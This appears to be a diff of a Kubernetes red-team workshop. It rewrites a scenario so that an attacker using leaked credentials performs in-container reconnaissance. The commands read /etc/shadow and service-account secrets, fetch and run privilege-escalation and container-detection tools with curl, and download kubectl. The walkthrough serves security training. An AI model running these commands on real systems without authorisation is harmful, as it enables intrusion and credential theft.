@@ -53,21 +53,69 @@ The general process looks like this:
 __Red__ purchased a bundle of leaked credentials online. One set of credentials appears to be for a publicly accessible kubernetes cluster. They've downloaded the creds and want to connect to the cluster to see what's available.
 
 ```console
-cd ./workshop/scenario_1
-export KUBECONFIG=./kubeconfig
+id
 ```
-
-## Getting Some Loot
-
-Since __Red__ has high-level credentials to the cluster, the process is fairly simple to start. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible.
-
-Let's become __Red__ and try some basic information-gathering commands to get a feel for the environment.
-
-What namespaces are already on the cluster?
 ```console
-kubectl get namespaces
+uname -a
 ```
-What workloads are in the default namespace?
+```console
+cat /etc/lsb-release /etc/redhat-release
+```
+```console
+ps -ef
+```
+```console
+df -h
+```
+```console
+netstat -nl
+```
+
+Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container.
+
+Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank">a basic Linux config auditor</a> to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel.
+
+```console
+cat /etc/shadow
+```
+```console
+ls -l /home
+```
+```console
+ls -l /root
+```
+```console
+cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
+```
+
+That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:
+
+```console
+cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
+```
+
+This tells us several things:
+
+* We are in a container, and it's managed by Kubernetes
+* Some security features are not in use (userns)
+* Seccomp is disabled, but a number of Syscalls are blocked
+* We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a>
+
+Now let's inspect our Kubernetes environment:
+
+```console
+env | grep -i kube
+```
+```console
+ls /var/run/secrets/kubernetes.io/serviceaccount
+```
+
+We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next:
+
+```console
+export PATH=/tmp:$PATH
+cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
+```
 ```console
 kubectl get all
 ```
